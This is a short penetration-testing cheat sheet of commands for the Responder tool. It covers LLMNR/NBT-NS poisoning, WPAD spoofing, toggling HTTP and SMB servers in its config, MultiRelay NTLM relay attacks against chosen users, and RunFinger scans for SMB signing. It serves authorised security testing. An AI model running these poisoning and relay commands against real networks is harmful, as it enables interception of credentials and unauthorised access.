# responder

% responder, LLMNR, NBT-NS, Poisoning, man in the middle

## responder launch
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder –I eth0
```

## responder launch - analyze mode (no poisoning)
#plateform/linux #target/remote #cat/RECON 
```
responder –I eth0 -A
```

## responder launch with wpad file 
#plateform/linux #target/remote #cat/ATTACK/MITM 
```
responder -I eth0 --wpad
```

## responder http on
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder http off
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

## responder smb on
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## responder smb off
#plateform/linux #target/local #cat/UTILS
```
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

## multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u <user1> <user2>
```

## multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
multirelay -t <ip> -u ALL
```

## runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.
#plateform/linux #target/remote #cat/RECON 
```
runfinger -i <network_range>
```
